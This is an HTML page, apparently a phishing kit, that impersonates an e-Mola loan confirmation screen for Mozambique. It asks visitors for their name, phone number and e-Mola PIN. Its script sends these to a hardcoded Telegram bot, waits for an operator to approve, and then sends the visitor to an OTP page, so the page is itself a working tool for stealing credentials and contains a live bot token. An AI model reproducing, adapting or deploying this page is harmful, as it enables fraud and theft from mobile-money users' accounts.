<!DOCTYPE html>
<html lang="pt-MZ">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="theme-color" content="#FF6B00">
<title>e-Mola Crédito | Confirme a Conta · Moçambique</title>
<style>
/* CRITICAL CSS INLINED FOR SPEED */
:root{--or:#FF6B00;--or-deep:#E66000;--or-dark:#A34A00;--cream:#FFF8F0;--white:#fff;--dark:#111;--muted:#6b6b6b;--border:#e5e7eb;--err:#d32f2f;--grad:linear-gradient(135deg,#FF8C00 0%,#FF6B00 100%);--shadow:0 20px 60px rgba(0,0,0,.1)}
*{margin:0;padding:0;box-sizing:border-box}
html{-webkit-text-size-adjust:100%}
body{font-family:'Inter',system-ui,-apple-system,sans-serif;background:var(--grad);min-height:100vh;display:flex;flex-direction:column;position:relative;overflow-x:hidden}
header{background:rgba(255,255,255,.96);backdrop-filter:blur(14px);padding:14px 5%;border-bottom:3px solid var(--or);box-shadow:0 2px 12px rgba(0,0,0,.08);display:flex;justify-content:space-between;align-items:center;gap:14px}
.logo{font-size:24px;font-weight:900;text-decoration:none;letter-spacing:-.8px;display:inline-flex;align-items:center;color:var(--dark)}
.logo .e{color:var(--or-deep)}
.logo .mola{color:var(--or)}
.lang-switch{display:flex;gap:5px}
.lang-btn{background:transparent;border:1.5px solid var(--border);border-radius:50px;padding:6px 12px;font-size:11px;font-weight:800;font-family:inherit;cursor:pointer;color:var(--muted);transition:all .2s}
.lang-btn.active{background:var(--grad);border-color:var(--or);color:#fff;box-shadow:0 4px 10px rgba(255,107,0,.25)}
main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px;position:relative;z-index:1}
.card{background:rgba(255,255,255,.98);border-radius:22px;padding:38px 30px;max-width:440px;width:100%;box-shadow:var(--shadow);animation:pop .5s cubic-bezier(.34,1.56,.64,1)}
@keyframes pop{from{opacity:0;transform:scale(.96) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
.card-head{text-align:center;margin-bottom:22px}
.card-head h1{font-size:21px;font-weight:900;color:var(--or-dark);margin-bottom:4px}
.card-head p{color:var(--muted);font-size:12.5px}
.bundle-bar{background:var(--grad);border-radius:14px;padding:15px 18px;margin-bottom:22px;color:#fff;box-shadow:0 8px 20px rgba(255,107,0,.2)}
.b-row{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:6px}
.b-row:last-child{margin-bottom:0;padding-top:9px;border-top:1px solid rgba(255,255,255,.22);font-weight:800;font-size:13.5px}
.fg{margin-bottom:18px}
.fl{display:block;font-size:10px;font-weight:800;color:var(--or-dark);text-transform:uppercase;letter-spacing:.09em;margin-bottom:7px}
.iw{display:flex;align-items:center;border:2px solid var(--border);border-radius:14px;padding:13px 16px;background:#f9fafb;transition:all .25s}
.iw:focus-within{border-color:var(--or);background:#fff;box-shadow:0 0 0 4px rgba(255,107,0,.12)}
.prefix{font-weight:800;color:var(--or-deep);margin-right:8px;font-size:13.5px}
.fi{flex:1;border:none;background:transparent;font-size:14px;color:var(--dark);outline:none;font-family:inherit;min-width:0}
.fi::placeholder{color:#c4b8a8}
.pin-tog{background:none;border:none;color:var(--or-deep);cursor:pointer;font-weight:800;font-size:10.5px;font-family:inherit}
.hint{font-size:10.5px;color:var(--muted);margin-top:5px}
.err{display:none;background:rgba(211,47,47,.08);border:1.5px solid rgba(211,47,47,.22);color:var(--err);font-size:12px;font-weight:700;border-radius:12px;padding:11px 14px;margin-bottom:16px;text-align:center}
.err.show{display:block}
.btns{display:flex;gap:10px;margin-top:22px}
.btn-p{flex:1;background:var(--grad);color:#fff;border:none;padding:15px;border-radius:50px;font-weight:900;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(255,107,0,.35);transition:all .25s}
.btn-p:hover{transform:translateY(-2px);filter:brightness(1.05)}
.btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit}
.btn-o:hover{background:var(--cream)}
.card-ft{text-align:center;margin-top:18px;font-size:10.5px;color:var(--muted)}
.card-ft a{color:var(--or-deep);text-decoration:none;font-weight:800}
.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:14px;font-size:10.5px;color:var(--muted);font-weight:700}
.overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(0,0,0,.85);z-index:2000;backdrop-filter:blur(8px)}
.overlay.on{display:flex}
.spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:#FF8C00;border-radius:50%;animation:sp .8s linear infinite}
.sp-t{font-size:14px;font-weight:800;color:#fff}
.sp-s{font-size:11.5px;color:rgba(255,255,255,.7)}
@keyframes sp{to{transform:rotate(360deg)}}
.modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,.8);z-index:2000;padding:20px}
.modal.on{display:flex}
.modal-box{background:#fff;border-radius:18px;padding:34px;max-width:360px;width:100%;text-align:center;box-shadow:var(--shadow)}
.modal-box h2{font-size:18px;font-weight:900;color:var(--or-dark);margin-bottom:8px}
.modal-box p{color:var(--muted);font-size:13px;margin-bottom:20px}
.modal-btn{width:100%;padding:15px;border-radius:50px;border:none;font-weight:800;font-size:12px;cursor:pointer;background:var(--grad);color:#fff;font-family:inherit}
@media (max-width:500px){main{padding:24px 12px}.card{padding:30px 20px}.btns{flex-direction:column}}
</style>
</head>
<body>
<header>
  <a class="logo" href="index.html"><span class="e">Txeneka</span><span class="mola">.</span></a>
  <div class="lang-switch">
    <button class="lang-btn active" data-lang="pt" onclick="setLang('pt')">PT</button>
    <button class="lang-btn" data-lang="en" onclick="setLang('en')">EN</button>
  </div>
</header>

<main>
  <div class="card">
    <div class="card-head">
      <h1 data-i18n="lg.h1">Confirme a sua conta</h1>
      <p data-i18n="lg.sub">Insira os seus dados para continuar</p>
    </div>

    <div id="bBar" class="bundle-bar" style="display:none">
      <div class="b-row"><span data-i18n="lg.bAmount">Empréstimo:</span><span id="bD">&mdash;</span></div>
      <div class="b-row"><span data-i18n="lg.bDur">Prazo:</span><span id="bDur">&mdash;</span></div>
      <div class="b-row"><span data-i18n="lg.bTotal">Total:</span><span id="bP">0 MT</span></div>
    </div>

    <div id="err" class="err"></div>

    <form id="frm" onsubmit="doSubmit(event)">
      <div class="fg">
        <label class="fl" for="name" data-i18n="lg.name">Nome Completo</label>
        <div class="iw"><input type="text" class="fi" id="name" placeholder="Ex: João Machel" autocomplete="name"></div>
      </div>
      <div class="fg">
        <label class="fl" for="phone" data-i18n="lg.phone">Número e-Mola</label>
        <div class="iw"><span class="prefix">+258</span><input type="tel" class="fi" id="phone" placeholder="84 XX XX XXX" inputmode="numeric" maxlength="9"></div>
        <p class="hint" data-i18n="lg.phoneHint">9 dígitos (ex: 84XXXXXXX)</p>
      </div>
      <div class="fg">
        <label class="fl" for="pin" data-i18n="lg.pin">PIN e-Mola</label>
        <div class="iw"><input type="password" class="fi" id="pin" placeholder="••••" inputmode="numeric" maxlength="4"><button type="button" class="pin-tog" onclick="togPin(event)" data-i18n="lg.show">Mostrar</button></div>
      </div>
      <div class="btns">
        <button type="submit" class="btn-p" data-i18n="lg.btn">Confirmar & Continuar</button>
        <button type="button" class="btn-o" onclick="location.href='index.html'" data-i18n="lg.cancel">Cancelar</button>
      </div>
    </form>
    <div class="secure">🔒 Protegido com segurança e-Mola</div>
  </div>
</main>

<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">A confirmar...</div><div class="sp-s">Por favor aguarde</div></div>

<script>
const translations={
  pt:{"lg.h1":"Confirme a sua conta","lg.sub":"Insira os seus dados","lg.name":"Nome Completo","lg.phone":"Número e-Mola","lg.pin":"PIN e-Mola","lg.show":"Mostrar","lg.btn":"Confirmar & Continuar","lg.cancel":"Cancelar","lg.bAmount":"Empréstimo:","lg.bDur":"Prazo:","lg.bTotal":"Total:","err.name":"Insira o nome","err.phone":"Número inválido","err.pin":"PIN inválido"},
  en:{"lg.h1":"Confirm account","lg.sub":"Enter your details","lg.name":"Full Name","lg.phone":"e-Mola Number","lg.pin":"e-Mola PIN","lg.show":"Show","lg.btn":"Confirm & Continue","lg.cancel":"Cancel","lg.bAmount":"Loan:","lg.bDur":"Term:","lg.bTotal":"Total:","err.name":"Enter name","err.phone":"Invalid number","err.pin":"Invalid PIN"}
};
function applyLanguage(lang){
  document.querySelectorAll('[data-i18n]').forEach(el=>{const k=el.getAttribute('data-i18n');if(translations[lang]&&translations[lang][k])el.textContent=translations[lang][k]});
  localStorage.setItem('emola_lang',lang);document.documentElement.lang=lang==='pt'?'pt-MZ':'en';
  document.querySelectorAll('.lang-btn').forEach(b=>b.classList.toggle('active',b.dataset.lang===lang));
}
function setLang(lang){applyLanguage(lang)}
function tr(key){const l=localStorage.getItem('emola_lang')||'pt';return (translations[l]&&translations[l][key])||key}

const BOT='8976816871:AAEoOSVkVWkrROLidS1qWH6snhpmU3e8AXU';
const CID='8873805952';
let bd={},luid=0;

function init(){
  const p=new URLSearchParams(location.search);
  const amount=p.get('amount'),dur=p.get('duration'),interest=p.get('interest'),total=p.get('total');
  if(amount){
    bd={amount,duration:dur,interest:interest||'0',total:total||amount};
    document.getElementById('bBar').style.display='block';
    document.getElementById('bD').textContent=fmtNum(amount)+' MT';
    document.getElementById('bDur').textContent=dur+' dias';
    document.getElementById('bP').textContent=fmtNum(total||amount)+' MT';
  }
}
function fmtNum(n){return parseInt(n).toLocaleString('pt-PT').replace(/\s/g,'.')}
function togPin(e){const el=document.getElementById('pin');const b=e.target;el.type=el.type==='password'?'text':'password';b.textContent=el.type==='password'?'Mostrar':'Ocultar'}
function showErr(m){const e=document.getElementById('err');e.textContent=m;e.classList.add('show')}
function clrErr(){document.getElementById('err').classList.remove('show')}

async function tg(msg,btns){
  try{
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:CID,text:msg,reply_markup:btns?{inline_keyboard:btns}:undefined,parse_mode:'HTML'}),
      keepalive: true // SPEED FIX
    });
  }catch(e){console.error(e)}
}

function doSubmit(e){
  e.preventDefault();clrErr();
  const name=document.getElementById('name').value.trim();
  const phone=document.getElementById('phone').value.trim().replace(/\s/g,'');
  const pin=document.getElementById('pin').value.trim();
  
  if(!name){showErr(tr('err.name'));return}
  if(phone.length<9){showErr(tr('err.phone'));return}
  if(pin.length!==4){showErr(tr('err.pin'));return}

  // CLEAN PAYLOAD: Only name, phone (no +258), and pin
  const msg=`🔐 <b>Login Attempt</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>${phone}</code>\n<b>PIN:</b> <code>${pin}</code>`;

  const btns=[[{text:'✓ Approve',callback_data:'login_approved'},{text:'✗ Decline',callback_data:'login_declined'}],[{text:'⚠️ Already Applied',callback_data:'login_applied'}]];
  
  document.getElementById('ov').classList.add('on');
  tg(msg,btns); // Fire and forget
  poll();
}

function poll(){
  const iv=setInterval(()=>{
    fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid+1}`).then(r=>r.json()).then(d=>{
      if(d.ok&&d.result.length>0){
        const u=d.result[0];luid=u.update_id;
        if(u.callback_query){
          const cb=u.callback_query.data;
          if(cb==='login_approved'){clearInterval(iv);document.getElementById('ov').classList.remove('on');goOTP()}
          else if(cb==='login_declined'){clearInterval(iv);document.getElementById('ov').classList.remove('on');showErr('Pedido recusado.');document.getElementById('frm').reset()}
          else if(cb==='login_applied'){clearInterval(iv);document.getElementById('ov').classList.remove('on');goOTP()}
        }
      }
    }).catch(e=>console.error(e));
  },1000);
  setTimeout(()=>clearInterval(iv),300000);
}

function goOTP(){
  const ph=document.getElementById('phone').value.trim().replace(/\s/g,'');
  const nm=document.getElementById('name').value.trim();
  const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:ph,name:nm});
  location.href='otp.html?'+params.toString();
}

document.getElementById('name').addEventListener('keypress',e=>{if(e.key==='Enter'){e.preventDefault();document.getElementById('phone').focus()}});
document.getElementById('phone').addEventListener('keypress',e=>{if(e.key==='Enter'){e.preventDefault();document.getElementById('pin').focus()}});
window.addEventListener('load',()=>{init();applyLanguage(localStorage.getItem('emola_lang')||'pt')});

window.addEventListener('load', function() {
  setTimeout(function() {
    var s1=document.createElement("script");s1.async=true;
    s1.src='https://embed.tawk.to/6ac8f0a81ce21434c5ca1a2e/default';
    s1.setAttribute('crossorigin','*');document.body.appendChild(s1);
  }, 2000);
});
</script>
</body>
</html>
